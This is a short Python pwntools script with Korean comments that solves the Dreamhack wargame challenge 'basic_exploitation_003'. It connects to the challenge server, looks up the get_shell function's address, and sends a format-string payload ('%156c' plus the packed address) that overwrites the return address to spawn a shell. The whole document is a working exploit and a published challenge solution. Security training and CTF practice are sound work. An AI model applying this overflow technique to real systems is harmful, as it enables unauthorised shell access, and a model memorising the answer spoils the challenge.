from pwn import *

# 1. 연결 설정
# 로컬 파일이 있어야 ELF 분석이 가능하므로, 같은 폴더에 다운로드 받아두세요.
p = remote('host3.dreamhack.games', 22506)
elf = ELF('./basic_exploitation_003')

# 2. 주소 정보 수집
get_shell = elf.symbols['get_shell']

print(f"get_shell Address: {hex(get_shell)}")

# 3. 페이로드 구성
# %156c : 156바이트만큼 문자를 출력(확장)하여 버퍼와 SFP를 모두 덮음
# p32(get_shell) : 그 뒤에 get_shell 주소를 붙여 RET를 덮음
payload = b"%156c" + p32(get_shell)

# 4. 페이로드 전송
p.send(payload)

# 5. 셸 획득 확인
p.interactive()